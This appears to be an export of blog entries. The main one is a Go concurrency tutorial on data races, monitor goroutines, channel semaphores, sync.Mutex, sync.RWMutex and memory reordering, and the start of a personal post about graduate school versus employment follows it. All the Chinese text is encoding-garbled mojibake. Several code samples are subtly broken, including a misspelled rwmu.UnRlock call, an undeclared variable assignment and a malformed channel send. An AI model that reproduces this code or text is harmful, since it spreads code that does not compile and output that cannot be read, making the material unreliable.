    <content><![CDATA[<p>æ‰€è°“<code>å¹¶å‘</code>(concurrency) æ˜¯æŒ‡å‡ æ®µç¨‹åºåœ¨åŒä¸€æ—¶é—´æ®µå†…äº¤é”™æ‰§è¡Œï¼Œå½“æˆ‘ä»¬æ— æ³•è‚¯å®šä¸€ä¸ªäº‹ä»¶ä¸€å®šä¼šä¼šå…ˆäºå¦ä¸€ä¸ªäº‹ä»¶å‘ç”Ÿï¼Œé‚£ä¹ˆå°±å¯ä»¥è¯´è¿™å‡ ä¸ªæ—¶é—´æ˜¯â€œå¹¶å‘â€çš„ã€‚å¦‚æœä¸€ä¸ªå‡½æ•°åœ¨å¹¶å‘è°ƒç”¨æ—¶ä»èƒ½æ­£ç¡®æ‰§è¡Œï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯<code>å¹¶å‘å®‰å…¨</code>çš„ï¼›å¦‚æœä¸€ä¸ªç±»å‹çš„æ‰€æœ‰å¯è®¿é—®æ–¹æ³•å’Œæ“ä½œéƒ½æ˜¯å¹¶å‘å®‰å…¨çš„ï¼Œåˆ™å®ƒå°±æ˜¯ä¸€ä¸ªå¹¶å‘å®‰å…¨çš„ç±»å‹ã€‚</p>
<p>æœ¬æ–‡ä¸»è¦ä»‹ç»äº†å‡ ç§å¹¶å‘ç¼–ç¨‹ä¸­å¸¸è§çš„é—®é¢˜åŠå¯¹ç­–ï¼Œæ‰€æœ‰çš„ä¾‹å­éƒ½ä¼šç”¨ Go è¯­è¨€æ¥æè¿°ï¼Œè¿˜ä¼šæ¶‰åŠåˆ°ä¸€äº› Go å¯¹å¹¶å‘ç¼–ç¨‹çš„æ”¯æŒã€‚</p>
<span id="more"></span>

<h2 id="ç«æ€"><a href="#ç«æ€" class="headerlink" title="ç«æ€"></a>ç«æ€</h2><p>ç«æ€æ˜¯æŒ‡å¤šä¸ª goroutine å¹¶å‘æ‰§è¡Œæ—¶ï¼Œç¨‹åºæ— æ³•ç»™å‡ºæ­£ç¡®ç»“æœã€‚æ¯”å¦‚å¤šä¸ª goroutine åŒæ—¶ä¿®æ”¹äº†ä¸€ä¸ªåŒ…çº§åˆ«å˜é‡çš„å€¼ï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½å¯¼è‡´æŸä¸€ä¸ª goroutine çš„ä¿®æ”¹å¯¹å¦ä¸€ä¸ª goroutine ä¸å¯è§ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> amount = <span class="number">0</span></span><br><span class="line"><span class="keyword">var</span> done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        amount += <span class="number">100</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        amount += <span class="number">200</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    &lt;- done</span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¿™æ®µä»£ç æ‰§è¡Œä»¥åï¼Œbalance æœ‰å‡ ç§å¯èƒ½å–å€¼ï¼š300ï¼Œ200ï¼Œ100ã€‚ç¨‹åºä¸­çš„è¿™ç§çŠ¶æ€ç§°ä¸º<code>æ•°æ®ç«æ€</code>ï¼Œæ˜¯ç«æ€çš„ä¸€ç§ã€‚æ•°æ®ç«æ€å‘ç”Ÿåœ¨å¤šä¸ª goroutine å¹¶å‘è¯»å†™åŒä¸€ä¸ªå˜é‡å¹¶ä¸”è‡³å°‘ä¸€ä¸ªä¸ºå†™æ“ä½œçš„æ—¶å€™ã€‚</p>
<p>æœ‰ä¸‰ç§æ–¹æ³•å¯ä»¥é¿å…æ•°æ®ç«æ€ï¼š</p>
<ol>
<li>ä¸å¯¹å˜é‡åšå†™æ“ä½œã€‚å¦‚æœæ²¡æœ‰ goroutine å¯¹å˜é‡çš„å€¼è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆæ•°æ®ç«æ€è‡ªç„¶æ— ä»è¯´èµ·ã€‚</li>
<li>é¿å…å¤šä¸ª goroutine å¯¹ä¸€ä¸ªå˜é‡è¿›è¡Œè®¿é—®ã€‚ç®€è¨€ä¹‹å°±æ˜¯è¿™ä¸ªå˜é‡çš„æ‰€æœ‰æ“ä½œéƒ½åœ¨ä¸€ä¸ª<code>ç›‘æ§ goroutine</code> å†…æ‰§è¡Œï¼Œç”±äºä¸€ä¸ª goroutine å†…çš„ç»“æœæ˜¯<code>ä¸²è¡Œä¸€è‡´</code>çš„ï¼Œä¹Ÿå°±ä¸ä¼šäº§ç”Ÿä¿®æ”¹ä¸å¯è§çš„é—®é¢˜ã€‚</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> deposit = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>) <span class="comment">// å…¶å®ƒ goroutine é€šè¿‡è¿™ä¸ªé€šé“é—´æ¥å†™ amount</span></span><br><span class="line"><span class="keyword">var</span> balance = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>) <span class="comment">// å…¶å®ƒ goroutine é€šè¿‡è¿™ä¸ªé€šé“é—´æ¥è¯» amount</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> monitor()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">monitor</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> amount = <span class="number">0</span> <span class="comment">// amount è¢«é™åˆ¶åœ¨ monitor goroutine ä¸­</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> count := &lt;- deposit:</span><br><span class="line">                amount += count</span><br><span class="line">            <span class="keyword">case</span> balance &lt;- amount:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deposit</span><span class="params">(count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    deposit &lt;- count</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Balance</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &lt;- balance</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å³ä½¿ä¸€ä¸ªå˜é‡æ— æ³•è¢«å®Œå…¨é™åˆ¶åœ¨ä¸€ä¸ª goroutine å†…ï¼Œä¹Ÿå¯ä»¥æŠŠå¯¹è¿™ä¸ªå˜é‡çš„æ“ä½œåˆ’åˆ†ä¸ºå¥½å‡ ä¸ªé˜¶æ®µï¼Œåªè¦æ¯ä¸ªé˜¶æ®µè¢«é™åˆ¶åœ¨ä¸€ä¸ª goroutine å†…è®¿é—®å°±å¯ä»¥äº†ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Book <span class="keyword">struct</span> &#123;</span><br><span class="line">    content <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">write</span><span class="params">(origin <span class="keyword">chan</span>&lt;- *Book)</span></span> &#123;</span><br><span class="line">    book = <span class="built_in">new</span>(Book)</span><br><span class="line">    book.content = <span class="string">&quot;hello world&quot;</span></span><br><span class="line">    origin &lt;- book</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">revise</span><span class="params">(origin &lt;- <span class="keyword">chan</span> *Book, corrected <span class="keyword">chan</span>&lt;- *Book)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> book := <span class="keyword">range</span> origin &#123;</span><br><span class="line">        book.content += <span class="string">&quot;!&quot;</span></span><br><span class="line">        corrected &lt;- book</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>åœ¨ä¸€ä¸ªæ—¶åˆ»åªå…è®¸ä¸€ä¸ª goroutine æ“ä½œè¿™ä¸ªå˜é‡ã€‚è¿™ç§æ–¹æ³•ç§°ä¸º<code>äº’æ–¥æœºåˆ¶</code>ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¸¦ä¸€ä¸ªç¼“å†²çš„é€šé“æ¥å®ç°ï¼š</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> amount = <span class="number">0</span></span><br><span class="line"><span class="keyword">var</span> sema = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deposit</span><span class="params">(count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    sema &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125; <span class="comment">// è·å–ä¿¡å·é‡</span></span><br><span class="line">    amount += count</span><br><span class="line">    &lt;- sema <span class="comment">// é‡Šæ”¾ä¿¡å·é‡</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“ç„¶ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸ç®€é™‹çš„å®ç°ã€‚Go å·²ç»ä¸ºæˆ‘ä»¬é€ å¥½äº†å®Œå¤‡çš„è½®å­ï¼šsync.Mutexã€‚æœ‰äº†äº’æ–¥é”ï¼Œä»£ç å°±å¯ä»¥å†™æˆè¿™ä¸ªæ ·å­ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    mu sync.Mutex</span><br><span class="line">    amount <span class="keyword">int</span> <span class="comment">// é€šå¸¸è¢«ä¿æŠ¤å˜é‡æ”¾åœ¨é”åé¢å£°æ˜</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deposit</span><span class="params">(count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    mu.Lock()</span><br><span class="line">    amount += count</span><br><span class="line">    mu.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Balance</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    mu.Lock()</span><br><span class="line">    <span class="keyword">defer</span> mu.Unlock()</span><br><span class="line">    <span class="keyword">return</span> amount</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¦æ³¨æ„çš„æ˜¯ï¼Œsync.Mutex æ˜¯â€œä¸å¯å†å…¥â€çš„ã€‚</p>
<p>å½“è¯»æ“ä½œè¿œå¤šäºå†™æ“ä½œæ—¶ï¼Œäº’æ–¥é”ä¼šæ˜æ˜¾æ‹–ç´¯ç³»ç»Ÿçš„é€Ÿåº¦ï¼ˆæœ€ä¸¥é‡æ—¶åªæœ‰å•ä¸ª goroutine ä¼šè¢«æ‰§è¡Œï¼‰ã€‚è¯»å†™é” sync.RWMutex ç‰¹åˆ«é€‚åˆè¿™ç§åœºæ™¯ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    rwmu sync.RWMutex</span><br><span class="line">    amount <span class="keyword">int</span> <span class="comment">// é€šå¸¸è¢«ä¿æŠ¤å˜é‡æ”¾åœ¨é”åé¢å£°æ˜</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deposit</span><span class="params">(count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    rwmu.Lock()</span><br><span class="line">    amount += count</span><br><span class="line">    rwmu.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Balance</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    rwmu.RLock()</span><br><span class="line">    <span class="keyword">defer</span> rwmu.UnRlock()</span><br><span class="line">    <span class="keyword">return</span> amount</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯»å†™é”æ”¯æŒå››ç§æ“ä½œï¼šè·å¾—å†™é” Lock()ï¼Œé‡Šæ”¾å†™é” UnLock()ï¼Œè·å¾—è¯»é” RLock()ï¼Œé‡Šæ”¾è¯»é” UnRLock()ã€‚</p>
<p>å†™é”åˆç§°ä¸º<code>æ’å®ƒé”ï¼ˆXé”ï¼‰</code>ï¼šè‹¥äº‹åŠ¡ T å¯¹æ•°æ® A åŠ ä¸Š X é”ï¼ŒT å¯ä»¥è¯» A ä¹Ÿå¯ä»¥ä¿®æ”¹ Aï¼Œå…¶ä»–äº‹åŠ¡ä¸èƒ½å†å¯¹ A åŠ ä»»ä½•é”ï¼Œç›´åˆ° T é‡Šæ”¾ A ä¸Šçš„é”ã€‚è¿™ä¿è¯äº†å…¶ä»–äº‹åŠ¡åœ¨ T é‡Šæ”¾ A ä¸Šçš„é”ä¹‹å‰ä¸èƒ½å†è¯»å–å’Œä¿®æ”¹ Aã€‚</p>
<p>è¯»é”åˆç§°ä¸º<code>å…±äº«é”ï¼ˆSé”ï¼‰</code>ï¼šè‹¥äº‹åŠ¡ T å¯¹ æ•°æ® A åŠ ä¸Š S é”ï¼Œåˆ™ T å¯ä»¥è¯» A ä½†ä¸èƒ½ä¿®æ”¹ Aï¼Œå…¶ä»–äº‹åŠ¡åªèƒ½å†å¯¹ A åŠ  S é”ï¼Œè€Œä¸èƒ½åŠ  X é”ï¼Œç›´åˆ° T é‡Šæ”¾ A ä¸Šçš„ S é”ã€‚è¿™ä¿è¯äº†å…¶ä»–äº‹åŠ¡å¯ä»¥è¯» Aï¼Œä½†åœ¨ T é‡Šæ”¾ A ä¸Šçš„ S é”ä¹‹å‰ä¸èƒ½å¯¹Aåšä»»ä½•ä¿®æ”¹ã€‚</p>
<p>å†™é”æœ€å¤šæœ‰ä¸€ä¸ªï¼Œè€Œè¯»é”å¯ä»¥æœ‰å¤šä¸ªã€‚ä¸€ä¸ª goroutine è·å¾—å†™é”åï¼Œç›´åˆ°è¿™ä¸ªå†™é”è¢«é‡Šæ”¾å‰ï¼Œå…¶å®ƒ goroutine ä¸å¯ä»¥è·å¾—è¯»é”æˆ–è€…å†™é”ï¼›ä¸€ä¸ª goroutine è·å¾—è¯»é”åï¼Œå…¶å®ƒ goroutine å¯ä»¥è·å¾—è¯»é”ï¼Œä½†æ˜¯ä¸èƒ½è·å¾—å†™é”ã€‚</p>
<p>å¦‚æœå†™é”å’Œè¯»é”æ˜¯å¹³çº§çš„ï¼Œå‡è®¾å½“å‰å·²ç»ä¸Šäº†è¯»é”ï¼Œæ­¤æ—¶ä¸€ä¸ª goroutine çš„ Lock() æ“ä½œä¼šè¢«é˜»å¡ã€‚è€Œå¦‚æœä¸æ–­æœ‰ goroutine è·å¾—è¯»é”é‚£ä¹ˆ Lock() æ“ä½œå°±ä¼šä¸€ç›´é˜»å¡ä¸‹å»ã€‚å› æ­¤ï¼Œ<code>å†™é”çš„ä¼˜å…ˆçº§é«˜äºè¯»é”</code>ï¼Œå³å½“è·å¾—å†™é”çš„è¯·æ±‚äº§ç”Ÿä»¥åï¼Œç›´åˆ° Lock() æ‰§è¡ŒæˆåŠŸå‰æ‰€æœ‰ RLock() æ“ä½œéƒ½ä¼šé˜»å¡ã€‚</p>
<p>å¯¹è¯»æ“ä½œä¸Šè¯»é”ï¼Œé¿å…è¯»åˆ°è„æ•°æ®çš„åŒæ—¶åˆæé«˜äº†èµ„æºè®¿é—®é€Ÿåº¦ï¼</p>
<p>è¦æ³¨æ„çš„æ˜¯ï¼Œgo çš„è¯»å†™é”æ˜¯é€šè¿‡äº’æ–¥é”åŠ ä¸Šå¼•ç”¨è®¡æ•°å™¨å®ç°çš„ï¼Œæ‰€ä»¥é™¤éè¯»æ“ä½œç¡®å®è¿œè¿œæ¯”å†™æ“ä½œå¤šï¼Œå¦åˆ™è¯»å†™é”æœªå¿…å°±æ¯”äº’æ–¥é”æ•ˆç‡é«˜ã€‚</p>
<h2 id="å†…å­˜åŒæ­¥"><a href="#å†…å­˜åŒæ­¥" class="headerlink" title="å†…å­˜åŒæ­¥"></a>å†…å­˜åŒæ­¥</h2><p>å³ä½¿æ˜¯ä¸€ä¸ªåªåŒ…å«å•ä¸ªæ“ä½œçš„åªè¯»æ“ä½œï¼Œä¸Šé”ä¹Ÿæ˜¯å¿…è¦çš„ã€‚ä¸€æ˜¯ä¸ºäº†é˜²æ­¢è¿™ä¸ªæ“ä½œè¢«æ’å…¥åˆ°è¯¥å˜é‡çš„å†™æ“ä½œå‰ï¼ŒäºŒæ˜¯å°†å¤„ç†å™¨ç¼“å­˜ä¸­çš„å†…å®¹åˆ·å…¥å†…å­˜ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x, y <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        x = <span class="number">1</span>   <span class="comment">// A1</span></span><br><span class="line">        fmt.Print(<span class="string">&quot;y=&quot;</span>, y, <span class="string">&quot; &quot;</span>) <span class="comment">// A2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        y = <span class="number">2</span>   <span class="comment">// B1</span></span><br><span class="line">        fmt.Print(<span class="string">&quot;x=&quot;</span>, x, <span class="string">&quot; &quot;</span>) <span class="comment">// B2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    &lt;- done</span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äº Aã€B å››è¡Œè¯­å¥çš„äº¤æ›¿æ‰§è¡Œï¼Œä»¥ä¸Šä»£ç çš„å¦‚ä¸‹è¾“å‡ºæ˜¯å¯æ¥å—çš„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">y=0 x=1 // A1-&gt;A2-&gt;B1-&gt;B2 </span><br><span class="line">y=2 x=1 // B1-&gt;A1-&gt;A2-&gt;B2</span><br><span class="line">x=0 y=2 // B1-&gt;B2-&gt;A1-&gt;A2</span><br><span class="line">x=1 y=2 // A1-&gt;B1-&gt;B2-&gt;A2</span><br></pre></td></tr></table></figure>

<p>ç°ä»£è®¡ç®—æœºä¸€èˆ¬ä¼šæœ‰å¤šä¸ªå¤„ç†å™¨ï¼Œæ¯ä¸ªå¤„ç†å™¨éƒ½æœ‰è‡ªå·±çš„ç¼“å­˜ã€‚å¯¹å˜é‡çš„å†™æ“ä½œé€šå¸¸ä¸ä¼šç›´æ¥å†™å…¥å†…å­˜ï¼Œè€Œæ˜¯å…ˆè®°å½•åœ¨å¤„ç†å™¨ç¼“å­˜ä¸­ï¼Œåœ¨æ“ä½œç³»ç»Ÿè®¤ä¸ºå¿…è¦çš„æ—¶å€™å†åˆ·å›å†…å­˜ã€‚ç”±äºå¤„ç†å™¨ç¼“å­˜çš„å­˜åœ¨ï¼Œå†™æ“ä½œï¼ˆA1 &amp;&amp; B1ï¼‰å¯èƒ½ä¸ä¼šç«‹å³å¯¹å…¶å®ƒ goroutine å¯è§ï¼Œé‚£ä¹ˆå…¶å®ƒ goroutine å°±ä¼šä½¿ç”¨è¿‡æœŸå€¼ã€‚æ­¤å¤–ï¼Œç”±äºèµ‹å€¼è¯­å¥å’Œè¾“å‡ºè¯­å¥å¯¹åº”ä¸åŒå˜é‡ï¼Œç¼–è¯‘å™¨å¯èƒ½è®¤ä¸ºè¿™ä¸¤ä¸ªè¯­å¥çš„æ‰§è¡Œé¡ºåºæ˜¯ä¸é‡è¦çš„ï¼Œäºæ˜¯ç§è‡ªè°ƒæ¢äº†è¯­å¥çš„æ‰§è¡Œé¡ºåºï¼ŒCPU æ‰§è¡ŒæŒ‡ä»¤æ—¶ä¹Ÿå¯èƒ½å‘ç”ŸæŒ‡ä»¤é‡æ’ï¼Œåœ¨ä¸å½±å“è¯­ä¹‰çš„å‰æä¸‹æŠŠåé¢çš„æŒ‡ä»¤æ”¾åˆ°å‰é¢æ¥æ‰§è¡Œã€‚æˆ‘ä»¬å¯èƒ½çœ‹åˆ°è¿™æ ·çš„éé¢„æœŸè¾“å‡ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">y=0 x=0 // A2-&gt;B2-&gt;A1-&gt;B1 or A2-&gt;B2-&gt;B1-&gt;A1</span><br><span class="line">y=2 x=0 // B1-&gt;A2-&gt;B2-&gt;A1</span><br><span class="line">x=0 y=0 // B2-&gt;A2-&gt;A1-&gt;B1 or B2-&gt;A2-&gt;B1-&gt;A1</span><br><span class="line">x=1 y=0 // A1-&gt;B2-&gt;A2-&gt;B1</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ï¼ŒæŒ‡ä»¤çš„æ‰§è¡Œé¡ºåºçœ‹èµ·æ¥å°±å’Œä»£ç çš„ç¼–å†™é¡ºåºä¸ä¸€æ ·äº†ã€‚è€Œé€šé“é€šä¿¡å’Œäº’æ–¥é”è¿™æ ·çš„<strong>åŒæ­¥åŸè¯­</strong>ä¼šå¼ºåˆ¶åˆ·å›å†…å­˜ï¼Œå¹¶æ’å…¥å†…å­˜å±éšœï¼ˆMemory Barrierï¼‰ã€‚å¦‚æ­¤ä¸€æ¥æŸä¸ª Goroutine ä¸­æŒ‡ä»¤æ‰§è¡Œé¡ºåºå°±å¯¹åˆ«çš„ Goroutine å¯è§äº†ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x, y <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">var</span> ok = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        x = <span class="number">1</span>   <span class="comment">// A1</span></span><br><span class="line">        ok &lt;- <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">        fmt.Print(<span class="string">&quot;y=&quot;</span>, y, <span class="string">&quot; &quot;</span>) <span class="comment">// A2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        y = <span class="number">2</span>   <span class="comment">// B1</span></span><br><span class="line">        &lt;-ok</span><br><span class="line">        fmt.Print(<span class="string">&quot;x=&quot;</span>, x, <span class="string">&quot; &quot;</span>) <span class="comment">// B2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    &lt;- done</span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>å¹¶å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>é€‰æ‹©å¾ˆé‡è¦</title>
    <url>/2020/03/06/%E9%80%89%E6%8B%A9%E5%BE%88%E9%87%8D%E8%A6%81/</url>
    <content><![CDATA[<p>è™½ç„¶åœ¨æˆ‘å†™ä¸‹è¿™ç¯‡æ–‡å­—çš„æ—¶å€™å·²ç»æ˜¯å‘¨äº”å‡Œæ™¨äº†ï¼Œä½†æ‰“å¼€ç¼–è¾‘å™¨ã€æ•²ä¸‹ä¸€äº›ä¸œè¥¿è¿™ä¸ªæƒ³æ³•å…¶å®èŒèŠ½äºå‘¨å››æ™šä¸Šï¼Œæ‰€ä»¥æœ¬æ–‡ä¼šä»¥å‘¨å››æ™šè¿™ä¸ªæ—¶é—´æ®µä½œä¸ºèµ·ç‚¹ã€‚è®°å½•ä¸€ä¸‹å¿ƒæƒ…ï¼Œéšä¾¿æ‰¯æ‰¯ã€‚</p>
<h2 id="é€‰æ‹©ï¼šè¯»ç ”-or-å·¥ä½œï¼Ÿ"><a href="#é€‰æ‹©ï¼šè¯»ç ”-or-å·¥ä½œï¼Ÿ" class="headerlink" title="é€‰æ‹©ï¼šè¯»ç ” or å·¥ä½œï¼Ÿ"></a>é€‰æ‹©ï¼šè¯»ç ” or å·¥ä½œï¼Ÿ</h2><p>åŸå®šäºä¸‹å‘¨çš„æ–‡çŒ®é˜…è¯»æ£€æŸ¥è¢«çªç„¶æå‰åˆ°äº†ä»Šå¤©ï¼Œå› æ­¤ä¸å¾—ä¸ä¸´æ—¶æŠ±ä½›è„šï¼ŒåŒ†åŒ†æµè§ˆäº†å‡ ç¯‡æ–‡ç« ã€‚ç‰¹æ®Šæ—¶æœŸï¼Œæ£€æŸ¥å½“ç„¶ä¹Ÿé‡‡å–çº¿ä¸Šçš„å½¢å¼ä¸€ä¸ªæ¥ä¸€ä¸ªè¿›è¡Œã€‚æœ¬æ¥è¯´å¥½æ˜¯ 8 ç‚¹å¼€å§‹ï¼Œæ¯ä¸ªäººå¤§æ¦‚ 10 åˆ†é’Ÿï¼Œç»“æœæˆ‘ååœ¨ç”µè„‘å‰ç­‰äº†åˆç­‰ï¼Œç”šè‡³æ‰“äº†å‡ æŠŠæ¸¸æˆä¾ç„¶æ²¡è½®åˆ°æˆ‘ã€‚è«åçš„å‹åŠ›ä¹‹ä¸‹ä¹Ÿæ²¡åŠæ³•è¿›è¡Œæ›´å¤šåœ°å¤ä¹ ï¼Œäºæ˜¯æ‰“å¼€äº†å¾®ä¿¡çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¥½ç©çš„ï¼Œç»“æœåˆ·åˆ°äº†è¿™æ¡æ¨æ–‡ï¼š</p>
<p><img src="https://i.loli.net/2020/03/06/CDMyLPnrBKg7IRd.jpg" alt="è…¾è®¯æ‹›è˜æ¨æ–‡"></p>
<p>çªç„¶å¿ƒé‡Œä¸€æƒŠï¼Œå†çœ‹ä¸€ä¸‹å±å¹•å³ä¸‹è§’çš„æ—¶é—´ï¼Œå•Šï¼ä»Šå¤©å·²ç»æ˜¯ 2020/3/5 ï¼Œæ–°ä¸€å¹´çš„æ‹›è˜å·²ç»â€œè“„åŠ¿å¾…å‘â€äº†ã€‚è¯»ç ”è¿˜æ˜¯å·¥ä½œï¼Ÿè¿™ä¸ªé—®é¢˜å†æ¬¡æ¶Œè¿›æˆ‘è„‘æµ·ã€‚</p>
